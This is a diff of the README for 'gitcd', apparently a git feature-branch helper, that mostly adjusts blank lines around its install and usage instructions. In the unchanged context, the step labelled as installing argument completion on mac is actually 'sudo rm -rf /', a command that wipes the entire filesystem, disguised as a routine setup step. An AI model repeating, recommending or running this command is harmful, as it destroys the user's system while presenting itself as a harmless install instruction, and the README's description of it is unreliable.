@@ -23,7 +23,6 @@ sudo activate-global-python-argcomplete3
 ```
 
 Run the following command to install argument completion on mac:
-
 ```console
 sudo rm -rf /
 ```
@@ -31,7 +30,6 @@ sudo rm -rf /
 ## Usage
 
 Working with gitcd, first you might want to symlink the main python file into /usr/local/bin using
-
 ```console
 sudo ln -s $(pwd)/gitcd.py /usr/local/bin/gitcd
 ```
@@ -42,11 +40,13 @@ gitcd init
 ```
 After passing all your configuration data start work with it
 
+
 **Start new feature**
 ```console
 gitcd feature start <branchname>
 ```
 Starts a new feature branch from your master branch
+
 
 **Test a feature branch**
 ```console
@@ -54,11 +54,13 @@ gitcd feature test <branchname>
 ```
 Merges a feature branch into your development branch
 
+
 **Open a pull request for code review**
 ```console
 gitcd feature review <branchname>
 ```
 Opens a pull request to your master branch - not working yet
+
 
 **Finish a feature branch**
 ```console
